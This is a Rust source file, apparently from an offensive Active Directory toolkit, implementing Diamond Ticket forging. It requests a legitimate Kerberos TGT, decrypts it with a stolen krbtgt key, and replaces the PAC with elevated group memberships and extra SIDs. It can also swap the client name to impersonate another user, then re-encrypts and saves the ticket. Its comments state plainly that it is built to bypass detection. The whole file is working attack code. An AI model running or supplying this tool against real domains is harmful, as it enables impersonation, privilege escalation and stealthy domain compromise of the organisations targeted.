//! Diamond Ticket forging — modify a legitimately requested TGT's PAC.
//!
//! Unlike Golden Tickets (forged from scratch), Diamond Tickets start
//! with a real TGT, decrypt it with the krbtgt key, modify the PAC,
//! and re-encrypt. This bypasses detections that check for TGTs not
//! issued by the KDC.

use chrono::{Duration, Utc};
use kerberos_asn1::{Asn1Object, EncTicketPart, EncryptedData, Ticket};
use kerberos_crypto::new_kerberos_cipher;
use overthrone_core::error::{OverthroneError, Result};
use overthrone_core::proto::kerberos::{self, ETYPE_AES256_CTS, ETYPE_RC4_HMAC};
use tracing::info;

use crate::golden;
use crate::runner::{ForgeConfig, ForgeResult, ForgedTicket};
use crate::validate;

/// Forge a Diamond Ticket by modifying a legitimate TGT's PAC.
pub async fn forge_diamond_ticket(config: &ForgeConfig) -> Result<ForgeResult> {
    info!("[diamond] Forging Diamond Ticket for {}", config.domain);

    let krbtgt_hash = config
        .krbtgt_hash
        .as_deref()
        .or(config.krbtgt_aes256.as_deref())
        .ok_or_else(|| {
            OverthroneError::TicketForge("krbtgt hash is required for Diamond Ticket".into())
        })?;

    let domain_sid = config.domain_sid.as_deref().ok_or_else(|| {
        OverthroneError::TicketForge("Domain SID is required for Diamond Ticket".into())
    })?;

    validate::validate_sid_format(domain_sid)?;

    let password = config.password.as_deref().ok_or_else(|| {
        OverthroneError::TicketForge(
            "Password is required for Diamond Ticket (to request legitimate TGT)".into(),
        )
    })?;

    // Step 1: Request a legitimate TGT from the KDC
    info!(
        "[diamond] Step 1: Requesting legitimate TGT as {}",
        config.username
    );
    let legit_tgt = kerberos::request_tgt(
        &config.dc_ip,
        &config.domain,
        &config.username,
        password,
        false, // use password, not hash
    )
    .await?;

    info!(
        "[diamond] Legitimate TGT obtained (etype: {})",
        legit_tgt.session_key_etype
    );

    // Step 2: Decrypt the ticket's enc-part using krbtgt key
    info!("[diamond] Step 2: Decrypting ticket with krbtgt key");
    let krbtgt_key = hex::decode(krbtgt_hash.trim())
        .map_err(|e| OverthroneError::TicketForge(format!("Invalid krbtgt hash: {e}")))?;

    let krbtgt_etype = match krbtgt_key.len() {
        16 => ETYPE_RC4_HMAC,
        32 => ETYPE_AES256_CTS,
        _ => {
            return Err(OverthroneError::TicketForge(format!(
                "krbtgt key must be 16 or 32 bytes, got {}",
                krbtgt_key.len()
            )));
        }
    };

    let cipher = new_kerberos_cipher(krbtgt_etype)
        .map_err(|e| OverthroneError::TicketForge(format!("Cipher: {e}")))?;

    let decrypted_ticket = cipher
        .decrypt(&krbtgt_key, 2, &legit_tgt.ticket.enc_part.cipher)
        .map_err(|e| OverthroneError::TicketForge(format!("Ticket decrypt: {e}")))?;

    let (_, mut enc_ticket) = EncTicketPart::parse(&decrypted_ticket)
        .map_err(|e| OverthroneError::TicketForge(format!("Parse EncTicketPart: {e}")))?;

    info!("[diamond] Ticket decrypted successfully");

    // Step 3: Modify the PAC with elevated privileges
    info!("[diamond] Step 3: Replacing PAC with elevated privileges");
    let impersonate = config.effective_impersonate();
    let groups = config.effective_groups();
    let realm = config.domain.to_uppercase();

    let new_pac = golden::build_pac(
        impersonate,
        &realm,
        domain_sid,
        config.user_rid,
        &groups,
        &config.extra_sids,
        &krbtgt_key,
        krbtgt_etype,
    )?;

    // Replace authorization data (which contains the PAC)
    enc_ticket.authorization_data = Some(vec![kerberos_asn1::AuthorizationDataEntry {
        ad_type: 1, // AD-IF-RELEVANT
        ad_data: new_pac,
    }]);

    // Optionally change the client name if impersonating someone else
    if impersonate != config.username {
        enc_ticket.cname = kerberos_asn1::PrincipalName {
            name_type: 1, // NT_PRINCIPAL
            name_string: vec![impersonate.to_string()],
        };
        info!(
            "[diamond] Changed cname: {} → {}",
            config.username, impersonate
        );
    }

    // Step 4: Re-encrypt with krbtgt key (key_usage=7 for TGT enc-part per RFC 4120 §7.5.1)
    info!("[diamond] Step 4: Re-encrypting ticket");
    let re_encrypted = cipher.encrypt(&krbtgt_key, 7, &enc_ticket.build());

    let forged_ticket = Ticket {
        tkt_vno: 5,
        realm: legit_tgt.ticket.realm.clone(),
        sname: legit_tgt.ticket.sname.clone(),
        enc_part: EncryptedData {
            etype: krbtgt_etype,
            kvno: legit_tgt.ticket.enc_part.kvno,
            cipher: re_encrypted,
        },
    };

    let ticket_bytes = forged_ticket.build();
    let kirbi_bytes = golden::build_krb_cred(
        &forged_ticket,
        &enc_ticket,
        &legit_tgt.session_key,
        krbtgt_etype,
    )?;
    let kirbi_path = golden::save_ticket(config, &kirbi_bytes, "diamond")?;
    let etype_str = golden::etype_name(krbtgt_etype);
    let now = Utc::now();

    info!(
        "[diamond] Diamond Ticket forged ({} bytes)",
        ticket_bytes.len()
    );

    Ok(ForgeResult {
        action: "Diamond Ticket".into(),
        domain: config.domain.clone(),
        success: true,
        ticket_data: Some(ForgedTicket {
            ticket_type: "Diamond Ticket (modified TGT)".into(),
            impersonated_user: impersonate.to_string(),
            domain: realm,
            spn: format!("krbtgt/{}", config.domain.to_uppercase()),
            encryption_type: etype_str.into(),
            valid_from: now.format("%Y-%m-%d %H:%M:%S UTC").to_string(),
            valid_until: (now + Duration::hours(config.effective_lifetime() as i64))
                .format("%Y-%m-%d %H:%M:%S UTC")
                .to_string(),
            group_rids: groups,
            extra_sids: config.extra_sids.clone(),
            kirbi_path,
            ccache_path: None,
            kirbi_base64: Some(golden::base64_encode(&kirbi_bytes)),
            ticket_size_bytes: ticket_bytes.len(),
        }),
        persistence_result: None,
        message: format!(
            "Diamond Ticket forged: legitimate TGT modified with {} privileges ({}). \
             Harder to detect than Golden Ticket — ticket has real KDC issuance metadata.",
            impersonate, etype_str
        ),
    })
}
